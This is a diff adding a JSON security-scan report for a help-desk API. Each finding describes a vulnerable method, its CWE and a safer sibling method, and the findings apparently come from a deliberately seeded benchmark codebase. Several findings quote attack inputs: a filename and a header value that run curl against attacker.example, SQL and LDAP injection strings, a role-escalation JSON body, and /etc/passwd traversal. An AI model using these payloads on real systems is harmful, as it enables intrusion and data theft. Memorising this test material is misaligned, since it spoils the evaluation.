@@ -1,0 +1,464 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-query",
+      "path": "apps/api/src/tickets/tickets.service.ts",
+      "start": {
+        "line": 854,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 869,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "localAgenda() builds a raw SQL string with $queryRawUnsafe and splices the `timezone` value directly into the query text (`AT TIME ZONE '${timezone}'`). `timezone` comes straight from the client-controlled `workspace_timezone` cookie via readCookieValue() in tickets.controller.ts (no allowlist/validation), so a crafted cookie value such as `UTC'; --` or a UNION-based payload breaks out of the string literal and is executed as SQL. The equivalent report in reports.service.ts (dailyDigest) uses the safe tagged-template $queryRaw, which parameterizes interpolations automatically \u2014 this is the unsafe counterpart.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.unvalidated-object-assign-user-update",
+      "path": "apps/api/src/tickets/tickets.service.ts",
+      "start": {
+        "line": 787,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 803,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applySharedAgendaView() base64-decodes an attacker/user-supplied `config` route parameter into arbitrary JSON, does `Object.assign(patch, decoded)` with no schema/field validation, and passes the result straight to `this.prisma.user.update({ where: { id: user.id }, data: patch as Prisma.UserUpdateInput })`. Because the Prisma User model includes fields like `role`, `active`, `organizationId`, and `teamId`, any authenticated user (even a customer_user) can call GET /tickets/agenda/shared/:config with a base64url payload like {\"role\":\"support_admin\"} to overwrite their own privileged fields and escalate to admin. The analogous kb.service.ts applySharedDraftView() correctly validates the decoded payload against UpdateArticleDto with class-validator (whitelist/forbidNonWhitelisted) before use \u2014 this endpoint has no such check.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-exec-shell-string",
+      "path": "apps/api/src/files/files.service.ts",
+      "start": {
+        "line": 158,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 179,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "repackageAttachmentForRecordsRequest() derives `readerFormat` from `extname(attachment.fileName)` \u2014 the fileName is the customer-supplied upload's original name, sanitized at upload time in files.service.ts only by stripping `/\\\\?%*:|\"<>` (cleanFileName), leaving shell metacharacters like `$()`, backticks, `;`, `&`, and spaces intact. `readerFormat` is then interpolated unsanitized and unvalidated into a shell command string passed to `exec()` via `execAsync(\\`pandoc \"${sourcePath}\" -f ${readerFormat} -t plain -o \"${destPath}\"\\`)` (line 168), executed with a shell. An uploaded file named e.g. `a.txt$(curl${IFS}attacker.example/x|sh)` yields a crafted extension that is executed as a shell command when an agent triggers a records-request repackage. The sibling method repackageContractForCounselReview() (below it) is the safe twin: it validates the format against an allowlist (`allowedArchiveReaders`) and uses execFile with an argument array (`shell: false`), avoiding injection entirely.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-header-controlled-preset",
+      "path": "apps/api/src/reports/reports.service.ts",
+      "start": {
+        "line": 112,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 139,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "slaPrintout() takes `preset` directly from the client-supplied `x-print-preset` HTTP header (reports.controller.ts:81, default 'standard') with no validation, and interpolates it unsanitized into a bash command line: `spawn('bash', ['-c', \\`report-print --preset=${preset} --in=\"${dataPath}\" --out=\"${pdfPath}\"\\`], { shell: true })` (lines 121-125). Any authenticated staff user (support_admin or team_lead per assertReporter) can send `x-print-preset: standard; curl attacker.example/$(id) #` to achieve arbitrary command execution on the server. The near-identical escalationPrintout() method directly below validates the preset against an allowlist (`allowedEscalationPresets`) and calls `spawn('report-print', [...], { shell: false })` with an argument array \u2014 the safe twin of this vulnerable code.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.custom-xml-parser-file-scheme-entity",
+      "path": "apps/api/src/knowledge-base/legacy-macro-importer.ts",
+      "start": {
+        "line": 32,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 53,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "parseLegacyMacroExport() implements its own DOCTYPE/ENTITY resolver: extractEntities() parses `<!ENTITY name SYSTEM \"...\">` declarations from an attacker-controlled uploaded XML document, and resolveEntityValue() explicitly reads local files off disk when the entity value starts with `file://` (`readFileSync(value.replace('file://', ''), 'utf8')`), then substituteEntities() splices the file content into the document wherever `&name;` is referenced. This is invoked from KnowledgeBaseService.importLegacyMacros(), reachable via POST /knowledge-base/import/legacy-macros (any staff role), and the resolved macro `body` (which can contain arbitrary local file contents, e.g. `/etc/passwd` or app secrets) is stored as a new KB article and can be read back by the uploader.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.jwt-decode-without-verification",
+      "path": "apps/api/src/reports/reports.service.ts",
+      "start": {
+        "line": 252,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 264,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveDigestRelayReport() calls `this.jwt.decode(relayCode)` (line 255) which only base64-decodes the JWT payload and never verifies its signature, then trusts the resulting `teamId` claim to return that team's full SLA report (organization names, account numbers, requester/assignee emails) with no further authentication. Anyone can forge an unsigned/self-signed-looking JWT with an arbitrary `teamId` claim and pull another team's SLA data via GET /reports/sla/digest-relay?relayCode=... with no credentials required. The adjacent resolveSecureDigestRelayReport() (lines 269-284) is the safe twin: it calls `this.jwt.verifyAsync(...)` with a secret and algorithm allowlist before trusting the payload.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-role-check-privileged-account-creation",
+      "path": "apps/api/src/auth/auth.controller.ts",
+      "start": {
+        "line": 99,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 103,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The `POST /auth/field-technicians` route is guarded only by `@UseGuards(JwtAuthGuard)`, which merely requires any valid, active, authenticated user \u2014 there is no role check in the controller or in AuthService.provisionFieldTechnicianAccount() (auth.service.ts:190-208). The DTO/body never carries the caller's identity, so a logged-in `customer_user` can call this endpoint to create a brand-new `support_agent` account with attacker-chosen credentials, gaining staff-level access to tickets, internal notes, and escalations across the desk.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-role-check-privileged-account-creation",
+      "path": "apps/api/src/auth/auth.controller.ts",
+      "start": {
+        "line": 105,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 109,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Same missing-authorization flaw as the field-technicians endpoint above: `POST /auth/partner-technicians` is guarded only by JwtAuthGuard with no role/permission check, and AuthService.provisionPartnerTechnicianAccount() (auth.service.ts:214-232) creates a new `support_agent` account for any caller regardless of their own role, letting a low-privilege authenticated user (e.g. customer_user) self-provision a staff account.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-unescaped-filter",
+      "path": "apps/api/src/admin/admin.service.ts",
+      "start": {
+        "line": 71,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 85,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryEmployeeDirectory() builds the LDAP search filter with raw, unescaped user input: `const filter = \\`(uid=${dto.employeeId})\\`;` (line 75), then passes it to DirectoryClient.search(). `dto.employeeId` is only length-validated (1-100 chars), so an admin-facing caller can inject filter metacharacters such as `*)(uid=*))(|(uid=*` to alter the boolean structure of the query and match unintended directory entries. The sibling method IntegrationsService.verifyGroupAccess() in integrations.service.ts (lines 36-50) correctly escapes both inputs with `DirectoryClient.escape()` before building its filter \u2014 this is the unescaped, vulnerable counterpart of that same pattern.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function-eval",
+      "path": "apps/api/src/admin/admin.service.ts",
+      "start": {
+        "line": 502,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 521,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewTriageFormula() builds and immediately invokes a `new Function('metrics', \\`with (metrics) { return (${dto.expression}); }\\`)` where `dto.expression` is an attacker-supplied string (up to 300 chars) from the request body. This executes arbitrary JavaScript in the Node.js process with the `with` statement providing scope access, allowing code such as `require('child_process').execSync('...')` (Node's `Function` constructor gives access to the global scope, including `require` via `this.constructor.constructor`/global lookups) or simple resource-exhaustion payloads. Although gated behind assertAdmin(), this is a direct code-injection primitive with no sandboxing. The sibling previewStandardTriageFormula() (lines 525-544) is the safe twin: it selects from a fixed, hardcoded map of formula functions by id rather than evaluating arbitrary expressions.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code",
+            "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-filename-read",
+      "path": "apps/api/src/knowledge-base/kb.service.ts",
+      "start": {
+        "line": 346,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 351,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getDraftReferenceFile() joins the raw `fileName` route parameter directly into a filesystem path (`join(this.referenceDir, articleId, fileName)`) with no sanitization or containment check, then reads it with `readFile()`. Any staff user can request GET /knowledge-base/:id/reference-files/..%2f..%2f..%2fetc%2fpasswd (or an equivalent `../../` traversal sequence) to read arbitrary files on disk. The method directly below it, getPublishedReferenceFile() (lines 358-370), is the safe twin: it resolves the path with `resolve()` and explicitly rejects any result that escapes the article's base directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.upload.path-traversal-unrestricted-file-write",
+      "path": "apps/api/src/knowledge-base/kb.service.ts",
+      "start": {
+        "line": 280,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 302,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadArticleCoverImage() writes the uploaded file using the client-supplied `file.originalname` verbatim as the destination filename (`writeFile(join(this.coverImageDir, file.originalname), file.buffer)`, line 292) with no MIME-type allowlist, no size limit, and no filename sanitization (unlike files.service.ts's cleanFileName() used for ticket attachments). A crafted originalname containing `../` sequences can write outside coverImageDir, and because there is no content-type restriction, an attacker can upload an `.html`/`.svg` file that is then served back statically and rendered by browsers from `/public/kb-covers/<name>`, enabling stored XSS against anyone who views it.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.unvalidated-redirect-target",
+      "path": "apps/api/src/tickets/tickets.service.ts",
+      "start": {
+        "line": 587,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 621,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordEscalationDecision() calls `res.redirect(dto.returnTo)` (line 620) with `dto.returnTo` being an arbitrary, unvalidated string from the request body (EscalationDecisionDto only requires `@IsString()`). A phishing link mimicking the legitimate 'approve escalation from email' action can set `returnTo` to an attacker-controlled external URL, and once the authenticated manager's browser follows the approval link, they are redirected off-site. The sibling method acknowledgeQueueHandoff() (lines 623-647) is the safe twin: it validates `dto.returnTo` against the `ALLOWED_QUEUE_RETURN_PATHS` allowlist before redirecting, falling back to '/queue' otherwise.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "apps/api/src/integrations/integrations.controller.ts",
+      "start": {
+        "line": 149,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 158,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "partnerWidgetStatus() reflects the caller-supplied `Origin` request header directly back as `Access-Control-Allow-Origin` (`res.setHeader('Access-Control-Allow-Origin', origin ?? '*')`) while also setting `Access-Control-Allow-Credentials: true`, allowing any arbitrary origin to make a credentialed cross-origin request to this endpoint and read the response. The method immediately below, partnerWidgetStatusVerified() (lines 160-171), is the safe twin: it only echoes the Allow-Origin header when the requesting origin is present in the `EMBEDDABLE_WIDGET_ORIGINS` allowlist and adds a `Vary: Origin` header.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.query-selector-injection-unescaped-predicate",
+      "path": "apps/api/src/tickets/tickets.service.ts",
+      "start": {
+        "line": 1140,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1154,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "reviewCaseArchiveDocuments() interpolates the user-controlled `docType` query parameter unescaped into a manifest selector string: `index.find(\\`/manifest/document[@ticket='${ticket.id}'][@type='${docType}']\\`)` (line 1152). The custom evaluator in case-manifest.ts splits bracketed predicates on `' or '` (evaluatePredicate, using `.some()` across clauses), so a `docType` value like `x' or @confidential='true` breaks out of the intended `@type=` comparison and injects an `or @confidential='true'` clause, causing the filter to match all confidential case-archive documents regardless of the requested type \u2014 bypassing the intended document-type restriction. The portal counterpart reviewCaseArchiveDocumentsForPortal() (lines 1161-1174) is the safe twin: it escapes both `ticket.id` and `docType` with `escapeXPathString()` before building the selector.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic",
+            "CWE-91: XML Injection (XPath)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.insufficiently-random-session-id",
+      "path": "apps/api/src/common/workspace-session.store.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createWorkspaceSession() generates the `sessionId` used as a full authentication credential (WorkspaceSessionGuard resolves the acting user solely from this cookie value, with no additional secret) via `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 4)}`. `Math.random()` is not cryptographically secure and contributes only 2 base-36 characters (~1090 possible values) of entropy per session, while the timestamp component is easily guessable/observable. This makes workspace-session cookies (which authorize ticket follow-up mutations, queue handoffs, and kiosk logins) practically brute-forceable or predictable, unlike the bearer JWT used elsewhere which is properly signed.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values",
+            "CWE-338: Use of Cryptographically Weak PRNG"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.unvalidated-deep-merge",
+      "path": "apps/api/src/notifications/notifications.service.ts",
+      "start": {
+        "line": 49,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyDigestLayoutHeader() parses the fully attacker-controlled `x-digest-layout` request header as JSON and deep-merges it directly onto the shared per-user config object with lodash `merge(config, layout)` (line 53), with no field allowlist or schema validation. A crafted header value containing keys like `__proto__` or `constructor.prototype` can pollute the object/global prototype chain if the resolved lodash version does not defend against those keys, potentially affecting application-wide behavior beyond the caller's own session. The adjacent method applyDigestLayoutSelection() (lines 62-75) is the safe twin: it destructures only the three known boolean fields (`email`, `sms`, `push`) before applying them with `Object.assign`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.attacker-controlled-hash-cost-factor",
+      "path": "apps/api/src/auth/auth.service.ts",
+      "start": {
+        "line": 190,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 191,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "provisionFieldTechnicianAccount() hashes the new account's password with `bcrypt.hash(dto.password, dto.hashStrength ?? 4)`, where `hashStrength` is a caller-supplied field (FieldTechnicianProvisionDto, bounded 4-14 by @Min/@Max but still attacker-selectable). A bcrypt cost factor of 4 is far below the recommended minimum (10-12+), making offline brute-force of the resulting password hash dramatically cheaper if the database is ever compromised. Combined with the missing-authorization issue on this same endpoint, any authenticated caller can mint a support_agent account with a deliberately weak hash.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
